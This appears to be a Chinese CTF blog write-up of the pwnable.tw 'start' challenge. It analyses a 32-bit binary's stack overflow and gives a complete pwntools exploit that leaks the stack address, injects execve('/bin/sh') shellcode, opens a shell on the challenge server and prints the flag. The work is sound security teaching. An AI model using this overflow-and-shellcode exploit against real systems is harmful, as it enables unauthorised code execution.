---
title: 【Pwnable.tw】start
date: 2019-10-25 21:04:14
tags:
- 二进制
- Linux
- CTF
categories: Pwn
---

# [Pwnable.tw](http://pwnable.tw/) start

程序链接：https://pwnable.tw/static/chall/start

## 0x01 检查保护情况

不得不说，[checksec](http://www.trapkit.de/tools/checksec.html)这个工作看似简单，用用现成工具就行，但这决定了我们之后漏洞利用的方式，是否栈代码执行，还是ROP。
最好多用几个工具进行检查，兼听则明。比如这个程序用peda检查就开启了NX，但实际上并没有。所以理想的话，把shellcode布置到栈上就可以了！

```shell
$ checksec  ./start
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

**RELRO(Relocation Read Only)：尽量使存储区域只读**

## 0x02 漏洞分析

用IDA逆向分析，汇编代码

```c
保存现场环境esp、_exit
.text:08048060                 push    esp
.text:08048061                 push    offset _exit

清空寄存器EAX EBX ECX EDX
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx

向栈上压入参数
.text:0804806E                 push    3A465443h    CTF:
.text:08048073                 push    20656874h    the
.text:08048078                 push    20747261h    art
.text:0804807D                 push    74732073h    s st
.text:08048082                 push    2774654Ch    Let’

系统调用80h
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write

系统调用80h
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -

恢复栈平衡，返回到_exit
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
.text:0804809C _start          endp ; sp-analysis failed
```



### **INT 80h 系统调用方法**

**系统调用的过程**可以总结如下：
1． 执行用户程序(如:fork)
2． 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。
3． 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式）
4． 进行中断处理，根据系统调用表调用内核函数。
5． 执行内核函数。
6． 执行RESTORE_ALL并返回用户模式
Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。

[关于系统调用的功能号](http://syscalls.kernelgrok.com/)：

```shell
#define __NR_exit                 1
#define __NR_fork                 2
#define __NR_read                 3
#define __NR_write                4
#define __NR_open                 5
#define __NR_close                6
#define __NR_waitpid              7
#define __NR_creat                8
#define __NR_link                 9
#define __NR_unlink              10
#define __NR_execve              11
```

**第一个系统调用：**
将esp开始的14h字节数据写入标准输出（文件描述符1），即输出"Let's start the CTF:“

|name	|eax	|ebx	|ecx	|edx	|
|---	|---	|---	|---	|---	|
|[sys_write](http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html)	|0x04	|unsigned int fd = 1	|const char __user *buf = esp	|size_t count =14h	|
|---	|---	|---	|---	|---	|

**第二个系统调用：**
从标准输入读取3ch字节到栈空间

|name	|eax	|ebx	|ecx	|edx	|
|---	|---	|---	|---	|---	|
|[sys_read](http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html)	|0x03	|unsigned int fd = 1	|char __user *buf = esp	|size_t count  = 3ch	|
|---	|---	|---	|---	|---	|

### 栈变化情况

1. 程序执行到0804808F：sys_write

输出14h字节数据：Let's start the CTF:

```
                +-----------------+      <----
                |       Let’      |         |     
                +-----------------+         |
                |       s st      |         |
                +-----------------+         |
                |       art       |        14h
                +-----------------+         |
                |       the       |         |
                +-----------------+         |
                |       CTF:      |         |
                +-----------------+      <-----
                |   offset _exit  |
                +-----------------+
                |    Saved ESP    |
            H-> +-----------------+
```

1. 08048097: sys_read

read函数最多可以读取3ch字节，超出了分配的空间，可以用来覆盖ret_addr和esp。经调试验证，20字节后覆盖ret，24字节后覆盖esp。

```
gdb-peda$ pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 20
Registers point to pattern buffer:
[ECX] --> offset 0 - size ~32
[ESP] --> offset 24 - size ~8
Pattern buffer found at:
0xffcc2764 : offset 0 - size 30 ($sp + -0x18 [-6 dwords])
Reference to pattern buffer not found in memory
```

```
       +-----------------+      <----
       |       aaaa      |         |     
       +-----------------+         |
       |       aaaa      |         |
       +-----------------+         |
       |       aaaa      |        14h
       +-----------------+         |
       |       aaaa      |         |
       +-----------------+         |
       |       aaaa      |         |
       +-----------------+      <-----
       |       aaaa      |
       +-----------------+
       |    Saved ESP    |
   H-> +-----------------+
```

## 0x03 漏洞利用

### 利用思路

现在EIP已经在我们的掌控之中了，关键是如何跳转到布置的shell code中。一般来说，首先会去找JMP ESP指令，这样就能让shellcode获得执行。但这段汇编代码没有，可以利用的只有read和write。如果可以write出Saved ESP的地址，然后覆盖掉offset _exit，就能成功shell。

1. 泄露Saved ESP

```python
    start = p.recvuntil(':')  //等待write执行完毕
    payload = 'a'*0x14 + p32(0x08048087)   //发送溢出数据，覆盖ret为0x08048087->输出14h字节
    p.send(payload)
    data = p.recv()    //接收输出数据，其中就有Saved ESP
```

debug过程：

```shell
[DEBUG] Received 0x14 bytes:
    "Let's start the CTF:"
[DEBUG] Sent 0x18 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  87 80 04 08                            │aaaa│····││
    00000018
[DEBUG] Received 0x14 bytes:
    00000000  **20 53 81**** ff**  01 00 00 00  58 6d 81 ff  00 00 00 00  │ S··│····│Xm··│····│
    00000010  60 6d 81 ff                                         │`m··││
    00000014
```

2. 覆盖RET

此时程序已经泄露出之前的Saved_esp，栈的情况已经摸清了，然后程序继续执行read，注意read完 add esp, 14h后再ret，因此，ret_addr在esp+14h的地方。

```python
    payload = 'a'*0x14 + p32(saved_esp + 20) + shellcode
    print p32(saved_esp)
    p.send(payload)
```

3. shellcode

shellcode同样可以用系统调用的方式执行execve("/bin/sh",NULL,NULL)

|name	|eax	|ebx	|ecx	|edx	|esi	|
|---	|---	|---	|---	|---	|---	|
|[sys_execve](http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html)	|0x0b	|char __user *	|char __user *__user *	|char __user *__user *	|[struct pt_regs](http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19)	|
|---	|---	|---	|---	|---	|---	|

其中，该程序是 32 位，所以我们需要使得

* 系统调用号，即 eax 应该为 0xb
* 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
* 第二个参数，即 ecx 应该为 0
* 第三个参数，即 edx 应该为 0


```c
xor eax,eax     //清空eax
push eax        //0入栈，当作字符/bin/sh结尾
push '/sh'
push '/bin'     //'/sh'为3字节，未对齐' ->'/sh\0'或//sh
mov ebx, esp    //指向/bin/sh地址
xor ecx,ecx
xor edx,edx
mov al, 0xb     //系统调用号
int 80
```

```c
shellcode='''
xor eax,eax
push eax
push %s
push %s
mov ebx, esp
xor ecx,ecx
xor edx,edx
mov al, 0xb
int 0x80''' %(u32('/sh\0'),u32('/bin'))
```

使用asm(shellcode)来进行汇编,可以使用context来指定cpu类型以及操作系统，如context(arch = 'amd64' , os = 'linux', log_level="debug")


### Catch THE FLAG

```python
from pwn import *
from binascii import *

shellcode='''
xor eax,eax
push eax
push %s
push %s
mov ebx, esp
xor ecx,ecx
xor edx,edx
mov al, 0xb
int 0x80''' %(u32('/sh\0'),u32('/bin'))

def dbg():
    p = process('./start')
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    context.log_level = 'debug'
    gdb.attach(proc.pidof(p)[0])
    pause()
    return p

def leak_esp(p):
    start = p.recvuntil(':')
    payload = 'a'*0x14 + p32(0x08048087)
    p.send(payload)
    saved_esp = p.recv()[:4]
    return u32(saved_esp)

def pwn(p,saved_esp):
    payload = 'a'*0x14 + p32(saved_esp + 20) + asm(shellcode)
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    # p = dbg()
    # p = process("./start")
    p = remote("chall.pwnable.tw",10000)
    saved_esp = leak_esp(p)
    print "leak saved_esp: %s" %hex(saved_esp+20)
    pwn(p,saved_esp)
```

```shell
$ python ./start.py
[+] Opening connection to chall.pwnable.tw on port 10000: Done
leak saved_esp: 0xffb43704
[*] Switching to interactive mode
$ whoami
start
$ find -name flag
./home/start/flag
$ cat ./home/start/flag
FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
```


## REF

[Linux 系统调用](https://introspelliam.github.io/2017/08/06/pwn/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/)

**pwntools使用**
http://brieflyx.me/2015/python-module/pwntools-intro/
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/
https://tianstcht.github.io/pwntools%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/
